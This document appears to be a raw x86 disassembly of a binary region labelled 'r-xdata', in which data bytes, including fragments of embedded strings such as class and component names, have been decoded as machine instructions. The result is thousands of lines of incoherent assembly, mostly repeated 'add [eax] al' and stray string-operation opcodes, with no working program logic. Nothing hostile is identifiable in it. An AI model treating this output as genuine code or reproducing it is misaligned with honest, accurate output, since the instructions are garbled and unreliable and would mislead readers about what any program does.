je r-xdata
inc eax
add [ eax ] al
xor al 0xcb
imul edi [ edx + 0x65 ] 0x129c0303
inc eax
add [ eax + eax ] dl
add al [ eax ]
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ecx + edx ] dl
inc eax
add [ eax + eax ] cl
or ch [ ecx + ebp * 2 + 0x62 ]
dec esi
ja r-xdata
popad
je r-xdata
je r-xdata
dec edi
ja r-xdata
popad
je r-xdata
inc eax
add [ eax + eax ] bl
or [ ebx + 0x62 ] esp
push edi
jb r-xdata
add [ ecx ] ah
adc al 0x11
bound eax [ eax ]
cld
rol [ ebx ] cl
push es
inc ebx
outsd
jo r-xdata
imul edi [ edx + 0x65 ] 0x20002
insd
inc ecx
popad
jo r-xdata
and [ ebx + ecx * 8 ] esi
inc eax
add [ eax + eax ] cl
add esi [ ebx + 0x74 ]
insd
add al [ eax ]
add al [ eax ]
nop
pushfd
xchg edi eax
inc edx
add [ edi ] al
push cs
push esp
push ebx
je r-xdata
insb
popad
add al [ bx + si ]
add al [ eax ]
xor al [ eax ]
mov al 0xd6
inc ebx
add [ 0x6e6f6c43 ] al
add eax [ gs : ebx ]
pushfd
adc al [ eax ]
adc [ eax ] al
add al [ eax ]
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
adc al 0x11
add [ eax ] al
cwde
inc edx
add [ eax ] al
add [ eax ] al
add [ ebx ] al
jb r-xdata
inc eax
jb r-xdata
add eax [ eax ]
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
and [ eax ] eax
0x40
inc eax
add [ eax + eax ] dl
or [ eax ] al
adc al 0x41
jne r-xdata
cdq
inc edx
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x14
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
add [ eax + ebx * 4 ] ah
inc edx
add [ eax ] cl
or [ edi + eax * 2 + 0x65 ] edx
je r-xdata
push 0x408d7069
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 4 ] al
insb
popad
jae r-xdata
inc edx
add [ edx ] al
add [ edx ] al
xchg edi eax
xchg ebx eax
inc edx
add ah dl
sbb eax 0x40
pop es
inc ebx
insb
popad
jae r-xdata
add [ edx ] cl
inc edi
jne r-xdata
dec ecx
outsb
arpl [ ebp + esi * 2 + 0x64 ] bp
inc ecx
jae r-xdata
pop eax
inc eax
add ah dl
pop eax
inc eax
add [ eax - 0x2fffbfa8 ] dh
add [ ecx ] al
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
jae r-xdata
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
insb
popad
jae r-xdata
je r-xdata
jae r-xdata
add [ eax + eax ] al
add [ eax ] al
inc eax
add al bl
pop eax
aam 0x58
adc [ eax + edx * 2 + 0x65 ] dl
jb r-xdata
inc edx
add [ edx ] al
add [ edx ] al
add [ esi + eax * 4 ] ch
inc edx
add [ eax + eax ] cl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ edx ] al
add [ edx ] al
rcl [ edi + 0x20042 ] cl
add dh bl
xchg edi eax
push esp
jae r-xdata
push es
jbe r-xdata
jae r-xdata
add [ edi ] ah
add [ eax + 0x70042f6 ] ah
inc esp
jae r-xdata
add [ edx ] al
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
imul esi [ ebx + 0x74 ] 0x43746e65
insb
popad
jae r-xdata
jae r-xdata
or [ gs : esi + 0x61 ] dh
inc edx
add [ eax ] al
add [ edx ] al
add [ ebx + 0x429a30c0 ] cl
add [ ebx ] al
or dl [ esi + edx * 2 + 0x61 ]
je r-xdata
dec esi
add [ eax ] al
adc [ eax ] al
insb
add al [ eax ]
add [ eax ] ah
cwde
inc edx
add [ eax ] cl
add [ eax + edx * 2 ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ edx ] al
add [ eax ] al
0x42 0x5304
jb r-xdata
push ebp
inc eax
add [ eax + 0x42f6 ] ah
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
fcomp [ edx + 0x42 ]
add [ eax + eax ] al
add [ eax ] al
pop es
inc esi
inc edi
jb r-xdata
add ah al
pushad
inc edx
add [ 0x2000000 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add ah al
pushad
inc edx
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
js r-xdata
jae r-xdata
add eax 0x694e6176
insb
or al 0x76
popad
jbe r-xdata
imul ebp [ esi + 0x61 ] 0x76057972
popad
push ebx
je r-xdata
push esp
jns r-xdata
insb
popad
add [ bx + si ] eax
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or [ esi + 0x61 ] dh
push ebx
imul ebp [ esi + 0x67 ] 0x4e617605
inc ebx
outsd
insb
insb
push es
jbe r-xdata
dec ecx
outsb
je r-xdata
arpl [ edx ] ax
add [ edx ] al
add [ eax + r-xdata ] dl
pop es
or al 0x54
inc ebx
insb
popad
jae r-xdata
add al [ eax ]
add [ edx + 0x42 ] bl
add al 0x53
jns r-xdata
jo r-xdata
inc edx
add ah al
cwde
inc edx
add bh bl
add al [ eax ]
mov eax eax
les ebx [ eax + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x9a
add [ ebx + 0x429b18c0 ] cl
inc edx
add [ eax ] cl
or edx [ edx + edx * 2 + 0x65 ]
popad
jb r-xdata
add [ ebx ] al
or dl [ esi + eax * 2 + 0x69 ]
insb
jb r-xdata
rcr [ eax ] 0x9b
inc edx
outsd
jae r-xdata
jb r-xdata
jae r-xdata
dec esp
push ebx
jne r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ 0x2c000000 ] dl
0x76060042 0x4e61
pop es
inc ebx
insb
popad
jae r-xdata
dec cx
imul ebp [ esp + ecx + 0x76 ] 0x6c6f4361
popad
dec esi
dec esp
imul esi [ ebx + 0x74 ] 0x49617606
outsb
je r-xdata
jb r-xdata
xor cl [ edx ]
jbe r-xdata
imul ebp [ esi + 0x67 ] 0x49617607
outsb
je r-xdata
inc esi
add [ eax ] al
or [ eax ] al
add [ eax ] eax
add [ edx + 0x42 ] bl
add al 0x53
insb
add al [ eax ]
add al [ eax ]
cmp al 0x0
shl dh 0x1
inc edx
add [ eax ] cl
inc edi
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax ] al
0x42 0x5304
insb
jne r-xdata
adc [ ecx + r-xdata ] bl
hlt
add al [ eax ]
add [ eax ] al
add al 0x0
jb r-xdata
jb r-xdata
jb r-xdata
or ah [ fs : esi + 0x66 ]
outsb
arpl [ ecx + 0x6 ] di
jbe r-xdata
push eax
jae r-xdata
add [ eax ] ecx
push es
jae r-xdata
jb r-xdata
pop es
jbe r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + ebx * 4 ] dl
inc esi
imul ebp [ ebp + 0x72 ] 0x67616c46
add [ eax ] eax
add eax 0x65536176
je r-xdata
jne r-xdata
inc ebp
js r-xdata
push es
jbe r-xdata
jbe r-xdata
insb
popad
jae r-xdata
add [ edx ] cl
inc ecx
inc ebx
insb
popad
jae r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
inc edi
jb r-xdata
push edx
popad
jb r-xdata
insb
popad
jae r-xdata
add [ eax - 0x42 ] bl
inc edx
add [ esi ] ch
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax - 0x42 ] bl
inc edx
add [ esi ] al
push esp
push edi
jb r-xdata
push edi
arpl [ eax ] ax
add [ eax ] ecx
push es
push edx
popad
jb r-xdata
inc ebx
push 0x50646c69
or ah [ esi + 0x66 ]
inc esp
popad
je r-xdata
jb r-xdata
je r-xdata
pushad
fwait
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x69 ]
insb
add [ eax + r-xdata ] dl
push es
imul ebp [ esi + 0x67 ] 0x760a656c
popad
imul ebp [ edi + 0x6e ] 0x53617608
dec ecx
outsb
je r-xdata
outsb
pop es
jbe r-xdata
outsb
or [ fs : esi + 0x61 ] dh
push ebx
je r-xdata
push esp
outsb
je r-xdata
inc esi
popad
insb
jae r-xdata
imul ebp [ esi + 0x64 ] 0x98c47265
inc edx
add eax [ eax ]
les esp [ eax + 0x42 ]
add [ eax ] cl
add [ edx ] al
add [ eax ] al
0x42 0x5304
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
insb
jne r-xdata
push esp
push esi
popad
dec esi
popad
insd
add al [ gs : eax ]
add al [ eax ]
cmp [ eax ] al
insb
test [ edx ] 0x7465470a
inc ebx
push edi
jb r-xdata
mov esp 0x800429b
add [ eax + r-xdata ] dl
or [ ebx ] cl
push esp
push edi
jb r-xdata
fwait
inc edx
add [ edx ] al
add [ eax - 0x65 ] bh
adc al 0x9b
add [ ebp + ebx * 4 + 0x2c0042 ] dl
add [ eax ] al
cmp al 0x14
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
je r-xdata
pushfd
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 4 ] ah
inc edx
add [ eax + 0x6800429c ] ch
popfd
inc edx
add [ eax ] al
je r-xdata
add [ eax - 0x4f ] bh
push esp
push edx
popad
jb r-xdata
push eax
or [ esi + 0x61 ] esi
push edi
push ebx
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
sub al 0x86
push 0x68004046
inc esi
popad
push ebx
je r-xdata
pop es
jbe r-xdata
imul ebp [ esi + 0x65 ] 0x616c4307
dec ecx
xor al 0xc
jbe r-xdata
jb r-xdata
outsb
or [ bp + 0x61 ] dh
inc esp
outsd
jne r-xdata
inc edx
add [ ebx ] cl
dec cx
outsb
push 0x74697265
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc al 0x9b
inc esi
cmp [ ebx + 0x74 ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ esi + eax * 4 ] ch
inc edx
add [ esi ] al
je r-xdata
jne r-xdata
popad
insd
add al [ eax ]
add ah ah
adc [ eax ] al
or [ eax ] al
add [ eax ] al
pop es
inc esi
inc edx
jne r-xdata
add [ eax ] al
jb r-xdata
nop
cwde
jb r-xdata
js r-xdata
add al [ eax ]
nop
imul ebp [ esi + 0x67 ] 0x49617607
inc edx
add [ eax + eax ] al
add [ eax ] al
pop es
inc esi
push ebx
je r-xdata
add [ eax ] al
or [ eax ] eax
add [ esi + eax * 4 ] ch
insd
add al [ eax ]
popad
inc ebx
outsb
insb
or dh [ gs : esi + 0x61 ]
jae r-xdata
push ebp
inc esi
insb
pop es
inc ebx
insb
popad
add [ eax ] al
jb r-xdata
inc ebx
jb r-xdata
push edx
add [ eax ] al
jb r-xdata
add [ edx + eax * 2 + 0x540b0800 ] bl
push ebx
je r-xdata
add [ eax + r-xdata ] dl
or [ ebx ] cl
push esp
jb r-xdata
pop eax
mov esi 0x2e0042
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
pop eax
mov esi 0x57060042
outsb
insb
dec ecx
inc edx
add [ esi ] ch
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax - 0x4f ] bh
inc edx
add [ esi ] al
or edx [ edi + edx * 2 + 0x72 ]
imul esi [ ebp + 0x72 ] 0x636f7250
add [ ecx ] al
or [ esi ] al
jae r-xdata
insd
pop es
push esp
push ebx
je r-xdata
jb r-xdata
add al dh
lahf
popad
je r-xdata
cwde
pushad
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] cl
inc esi
inc ecx
outsb
arpl [ ebp + 0x73 ] sp
je r-xdata
push ebx
jb r-xdata
pushfd
adc [ eax ] al
or al 0x0
add [ eax ] al
or [ esi + 0x42 ] al
jne r-xdata
add [ eax ] al
inc eax
mov al 0x58
popad
insd
push eax
jb r-xdata
inc ebx
add [ eax + 0x4d ] ah
inc ebx
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ ebp + edx * 2 + 0x4d380040 ] ah
popad
insd
add [ esi + eax * 4 ] ch
inc edx
add [ esi ] ch
add [ eax ] al
add [ edx ] al
arpl [ eax ] ax
add [ esp + eax * 2 ] dl
imul bp [ gs : esi + 0x65 ] 0x6942
outsb
popad
jb r-xdata
jb r-xdata
inc edx
add [ esi ] cl
inc esp
imul bp [ gs : esi + 0x65 ] 0x7250
outsd
jo r-xdata
insb
add al [ eax ]
add [ esi + eax * 4 ] ch
inc edx
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or al 0x0
add eax [ eax ]
and [ edi + 0x42 ] bl
add al 0x53
add al 0x4e
popad
insd
add al [ eax ]
add [ eax + edx + 0x80040 ] bl
pop es
inc edx
jne r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] ah
add [ eax ] al
cmovbe ecx [ ecx + 0x67 ]
outsb
outsd
jb r-xdata
add [ eax ] al
push ebx
imul edi [ edx + 0x65 ] 0x9c000002
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
pop es
inc esi
inc edx
jne r-xdata
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
arpl [ eax ] ax
add [ eax ] ecx
push es
push ebx
je r-xdata
add [ eax ] al
push eax
jb r-xdata
jo r-xdata
jns r-xdata
add al 0x4e
add al [ eax ]
add [ eax + 0x800429b ] bh
add [ ecx ] cl
push edi
add al [ gs : eax ]
add [ ebx + ebx * 4 + 0x42 ] dh
add [ eax ] dl
add [ eax ] cl
push edx
popad
inc esp
popad
je r-xdata
push ebx
imul edi [ edx + 0x65 ] 0x20002
daa
add [ eax ] bh
dec ebp
inc ebx
add [ edi ] al
inc esp
jae r-xdata
add [ edx ] al
add [ esi ] al
push ebx
je r-xdata
inc ebx
push 0x72646c69
outsb
add al [ eax ]
add [ eax ] al
add eax 0x429d9b00
add [ eax + eax - 0xc ] al
push eax
outsd
jae r-xdata
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax ] bh
dec ebp
popad
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4108ffff ] al
outsb
arpl [ ebp + 0x73 ] sp
je r-xdata
jae r-xdata
jne r-xdata
add [ ebx ] cl
inc esi
jb r-xdata
popad
insd
add [ eax ] al
sbb [ eax ] al
add eax 0x429f2000
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ esi + ecx * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
add [ 0x429f2000 ] al
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
cwde
pushfd
inc edx
add [ eax ] al
sbb al 0x40
add al [ eax ]
add ah bh
fwait
inc edx
add [ eax ] cl
add [ ecx ] cl
push edi
jb r-xdata
je r-xdata
je r-xdata
inc esp
jb r-xdata
pushfd
adc [ eax ] al
adc al 0x0
add [ eax ] al
pop es
inc esi
inc edx
jne r-xdata
add [ eax ] al
inc ebp
jbe r-xdata
jb r-xdata
add [ eax + eax ] al
add ah [ eax - 0x61 ]
add [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5204ffff ] al
outsd
outsd
je r-xdata
push 0x66667542
jb r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
and [ edi + 0x42 ] bl
add al 0x53
jns r-xdata
inc edx
add [ edx ] al
add [ edx ] al
jg r-xdata
add [ edx ] al
pushad
lahf
je r-xdata
popad
inc esp
popad
je r-xdata
inc esp
add al [ eax ]
add [ eax ] al
adc [ eax ] al
add al [ eax ]
pop es
dec eax
popad
jae r-xdata
jb r-xdata
jns r-xdata
jmp edx
add ah dh
inc ebp
outsb
add al [ fs : eax ]
add [ eax ] bl
aad 0x42
add [ eax ] bl
add [ eax ] al
add [ 0x6f6f5246 ] al
je r-xdata
add [ eax - 0x4f ] bh
outsb
je r-xdata
adc [ eax ] al
and al 0x0
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
inc edx
add [ edx ] al
add [ edx ] al
movsb [ edi ] [ esi ]
lahf
inc edx
add [ edx ] al
add [ edx ] al
insb
add al [ eax ]
add al [ eax ]
mov eax eax
and al 0x9f
inc edx
add [ edi ] al
push es
push esp
inc esi
imul ebp [ ebp + 0x72 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax ] ah
lahf
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
dec [ edx ]
dec esp
outsd
outsd
imul esi [ ebp + 0x70 ] 0x52
outsd
outsd
je r-xdata
aad 0x42
add [ eax + eax ] bl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
popad
insd
add [ eax ] al
sbb [ eax ] al
add eax 0x429f2000
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ esi + ecx * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
add [ 0x429f2000 ] al
inc esp
popad
je r-xdata
add al [ gs : eax ]
add ah bh
fwait
inc edx
add [ eax ] dl
add [ eax ] cl
push edx
popad
inc esp
popad
je r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
and [ edi + 0x42 ] bl
add al 0x53
insb
add al [ eax ]
add al [ eax ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax ] ah
lahf
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
outsd
outsd
je r-xdata
sbb ch dl
inc edx
add [ eax + eax ] bl
add [ eax ] al
or eax [ esi + 0x4c ]
outsd
outsd
imul esi [ ebp + 0x70 ] 0x52
add [ eax ] al
inc eax
adc al [ eax ]
or cl [ ebp + 0x65 ]
je r-xdata
add [ eax ] al
add al 0x8
push es
push edx
popad
jb r-xdata
add ah [ edi + ebx * 4 + 0x20042 ]
add al bh
lahf
inc edx
add [ edx ] al
add [ edx ] al
add [ eax ] bl
aad 0x42
add [ eax ] bl
add [ eax ] al
inc [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
insb
jne r-xdata
add al [ eax ]
add al [ eax ]
sub eax [ eax ]
add [ eax + 0x460b0042 ] ah
jae r-xdata
pushad
inc edx
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
add al [ eax ]
add [ eax ] al
adc [ eax ] al
add al [ eax ]
pop es
dec eax
popad
jae r-xdata
add al [ eax ]
add al [ eax ]
js r-xdata
push es
outsd
dec esi
popad
insd
add cl [ edx ]
dec ebp
push esp
push edx
popad
jb r-xdata
add [ eax + eax * 2 ] bl
popad
je r-xdata
clc
lahf
inc edx
jb r-xdata
jb r-xdata
inc eax
adc al [ eax ]
pop ebx
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax - 0x4f ] bh
jae r-xdata
add al [ gs : eax ]
add esp esp
adc [ eax ] al
pop es
inc ecx
jb r-xdata
outsd
dec esi
popad
je r-xdata
or cl [ ebp + 0x65 ]
je r-xdata
dec esi
popad
insd
push es
jae r-xdata
add al 0x4e
popad
outsb
add [ bx + si - 0x4f ] bh
inc edx
add [ eax ] bl
aad 0x42
add [ eax + 0x12 ] al
inc eax
add [ ebx ] bl
add [ eax ] al
sbb ch dl
inc edx
add [ ecx ] cl
add [ eax ] al
add eax [ eax ]
js r-xdata
add al [ eax ]
add [ eax ] eax
adc [ eax ] al
add eax 0x6f727245
jb r-xdata
inc eax
add [ 0x6f727245 ] al
jb r-xdata
jb r-xdata
jb r-xdata
add [ esi + ecx * 2 ] eax
push esp
push edx
popad
push es
push edx
popad
jb r-xdata
inc edx
add [ esi ] al
push edx
popad
jb r-xdata
add al [ eax ]
add [ eax + 0x12 ] eax
inc eax
add [ esi + ecx * 2 ] al
outsb
outsb
je r-xdata
inc eax
add [ ebp - 0x5f1fffc0 ] cl
inc edx
add [ eax ] cl
or eax 0x74655354
dec esi
jb r-xdata
outsb
add [ bx ] eax
inc ecx
jb r-xdata
add [ 0x706d6f43 ] cl
outsb
add [ 0x6f43 ] cl
insd
jo r-xdata
outsb
outsb
add [ bx + si - 0x4f ] bh
inc edx
add [ eax + 0x12 ] al
inc eax
add [ edi ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
js r-xdata
or [ ecx ] cl
inc ebx
outsd
push esp
push edx
popad
jb r-xdata
mov cl 0x42
jb r-xdata
inc eax
adc al [ eax ]
add al 0x4e
popad
insd
add al [ gs : eax ]
lea eax [ eax ]
jo r-xdata
add [ ecx ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ebp
jbe r-xdata
inc ebx
outsd
insd
jo r-xdata
outsb
je r-xdata
add [ ecx ] al
add [ eax ] dl
jae r-xdata
outsd
popad
insd
add al [ gs : eax ]
add ah al
pushad
inc edx
add [ esi ] cl
inc ebx
outsd
add al [ eax ]
outsb
outsb
add [ edx + 0x2000000 ] dl
add [ eax ] al
sbb ch dl
inc edx
popad
insd
push es
jae r-xdata
inc edx
add [ eax ] cl
adc edx [ edx + edx * 2 + 0x65 ]
jb r-xdata
inc edx
add [ esi ] al
push edx
popad
jb r-xdata
jb r-xdata
outsb
outsb
je r-xdata
outsb
insd
jo r-xdata
or [ ebx + 0x6f ] eax
je r-xdata
outsb
inc edx
add [ esi ] al
push edx
popad
jb r-xdata
outsb
outsd
je r-xdata
outsd
insd
jo r-xdata
add ecx [ eax ]
add al ah
mov al [ 0xd080042 ]
push esp
push ebx
je r-xdata
pop es
push eax
outsd
imul ebp [ esi + 0x74 ] 0x5017265
inc ebp
jb r-xdata
add [ eax ] bl
aad 0x42
push esp
inc ebx
outsd
insd
add al [ eax ]
adc [ ebx + 0xc080042 ] ah
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
js r-xdata
insb
popad
jae r-xdata
je r-xdata
outsb
jae r-xdata
outsb
arpl [ ebp + 0x4e ] sp
popad
insd
inc ebp
jbe r-xdata
popad
insd
add al [ gs : eax ]
fsub [ ecx + 0x16080042 ]
push esp
inc ecx
outsb
arpl [ ebp + 0x73 ] sp
je r-xdata
inc eax
adc al [ eax ]
add al 0x4e
add [ ecx ] al
jae r-xdata
add [ esi + ecx * 2 ] eax
push esp
inc ebx
outsd
outsb
outsb
inc eax
adc al [ eax ]
or eax 0x706d6f43
add [ eax ] al
jb r-xdata
insb
popad
jae r-xdata
jae r-xdata
outsd
outsb
outsb
outsb
je r-xdata
outsd
jb r-xdata
jb r-xdata
outsb
outsb
je r-xdata
inc edx
add [ eax + 0x12 ] al
inc eax
add [ eax ] al
adc [ eax ] al
pop eax
outsb
outsb
je r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax - 0x4f ] bh
inc edx
add [ esi ] al
push edx
popad
jb r-xdata
jb r-xdata
jo r-xdata
insb
adc [ eax + edx * 2 + 0x65 ] dl
jb r-xdata
add [ eax ] bl
aad 0x42
adc al [ eax ]
outsd
jne r-xdata
je r-xdata
outsb
inc ebx
outsd
insd
or [ ecx ] ecx
inc ebx
outsd
insd
jo r-xdata
insd
jo r-xdata
jae r-xdata
les esp [ eax + 0x42 ]
inc ebp
jbe r-xdata
jb r-xdata
add cl [ eax ]
push es
push edx
popad
popad
insd
push es
dec esi
add al 0x4e
add [ eax - 0x4f ] bh
inc edx
add [ eax + 0x12 ] al
inc eax
add ah ah
adc [ eax ] al
add [ eax ] dl
inc eax
add [ edx ] dh
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
js r-xdata
inc edx
outsd
outsd
insb
popad
outsb
inc eax
adc al [ eax ]
pop es
dec ebp
jae r-xdata
add [ eax ] al
push esp
push edx
popad
jb r-xdata
mov [ 0xc080042 ] eax
add [ eax ] dl
add [ eax + eax ] bh
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
sbb ch dl
inc edx
add [ ecx ] cl
inc ebx
outsd
insd
jo r-xdata
sbb ch dl
inc edx
dec eax
popad
outsb
insb
add al [ fs : eax ]
nop
pushfd
mov [ 0x18080042 ] eax
push esp
inc esi
imul ebp [ esi + 0x64 ] 0x706d6f43
outsd
jb r-xdata
jb r-xdata
add al [ eax ]
add [ eax ] ebx
aad 0x42
popad
jae r-xdata
imul esi [ ebx + 0x74 ] 0x43746e65
or [ esi ] al
outsb
outsb
je r-xdata
jo r-xdata
outsb
outsb
je r-xdata
add [ ecx ] cl
add [ ecx ] al
sbb ch dl
inc edx
je r-xdata
outsb
add [ eax + 0x12 ] al
inc eax
add ah al
pushad
inc edx
outsb
je r-xdata
insd
push es
jae r-xdata
push 0x614e646f
inc edx
add [ esi ] al
push edx
popad
jb r-xdata
insb
popad
add al [ gs : bx + si ]
add [ eax ] eax
adc [ eax ] al
pop es
outsd
insb
popad
jae r-xdata
push edx
popad
jb r-xdata
add ecx [ eax ]
push es
add al [ edi ]
push esp
push edx
popad
jb r-xdata
mov esp 0x80042a2
inc ebx
outsd
insd
jo r-xdata
add [ eax + r-xdata ] dl
or [ ebx ] dl
push esp
push edx
popad
add [ eax - 0x4f ] bh
push esp
inc ebx
outsd
insd
jo r-xdata
add al 0x8
push es
push edx
popad
jb r-xdata
popad
add [ eax - 0x4f ] bh
inc edx
add [ eax + 0x12 ] al
inc eax
add [ eax ] cl
mov al [ 0x750042 ]
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
js r-xdata
inc ebx
adc al [ eax ]
or [ ebx + 0x6c ] eax
inc ebp
outsb
je r-xdata
popad
jae r-xdata
dec ebp
pop es
push es
jae r-xdata
outsb
outsb
je r-xdata
adc edx [ edx + edx * 2 + 0x65 ]
popad
inc edx
add [ eax ] cl
outsb
outsb
je r-xdata
je r-xdata
add cl [ 0x706d6f43 ]
push esp
push edx
popad
jb r-xdata
add [ esi ] cl
push esp
push edx
popad
jb r-xdata
add cl [ ecx ]
inc ebx
inc edx
add [ esi ] al
outsb
outsb
outsb
outsb
outsb
je r-xdata
outsd
insd
jo r-xdata
dec esi
popad
insd
add al [ gs : eax ]
add [ eax ] ecx
mov al [ 0x430e0042 ]
push edx
popad
jb r-xdata
push es
outsb
je r-xdata
jae r-xdata
jb r-xdata
add [ edi ] eax
push eax
jb r-xdata
js r-xdata
outsd
insd
jo r-xdata
outsd
or eax 0x706d6f43
aad 0x42
add [ ecx ] cl
inc ebx
outsd
insd
jo r-xdata
outsb
outsb
je r-xdata
inc ebx
outsd
push cs
inc ebx
dec esi
popad
insd
push es
jae r-xdata
inc eax
add [ eax ] al
js r-xdata
popad
jae r-xdata
insb
popad
jae r-xdata
add [ eax - 0x4f ] bh
push esp
inc ebx
outsd
add ecx [ eax ]
push es
push edx
popad
jb r-xdata
popad
jae r-xdata
jbe r-xdata
outsd
outsb
dec eax
popad
outsb
insb
pop es
outsb
add [ bx ] eax
arpl [ eax ] ax
add [ eax ] ecx
or [ ebx + 0x6f ] eax
insd
jo r-xdata
inc edx
outsb
outsb
add [ eax + 0x12 ] al
inc eax
add [ eax ] al
adc al 0x40
add [ eax ] al
adc [ eax ] al
jpe r-xdata
outsb
outsb
je r-xdata
add eax [ eax ]
insb
inc edx
add [ esi ] dh
add al [ eax ]
lea eax [ eax ]
push eax
movsb [ edi ] [ esi ]
inc edx
add [ eax ] cl
adc eax 0x65724354
inc eax
add [ eax - 0x5c ] dl
jb r-xdata
jbe r-xdata
inc edx
add [ eax ] cl
mov al [ 0xffffffffd5180042 ]
add al [ eax ]
mov eax eax
add al 0xa5
inc edx
andps xmm0 [ ebx + 0x6f ]
insd
jo r-xdata
insd
jo r-xdata
inc edx
jbe r-xdata
je r-xdata
outsb
outsb
push esp
push edx
popad
jb r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add [ eax - 0x4f ] bh
pop es
outsb
outsb
je r-xdata
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
rol [ 0x18080042 ] 0x54
inc esi
imul ebp [ esi + 0x64 ] 0x6874654d
add [ eax ] cl
sbb [ esi + eax * 2 + 0x69 ] dl
outsb
dec ebp
add [ ebx + 0x42a504c0 ] cl
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
outsd
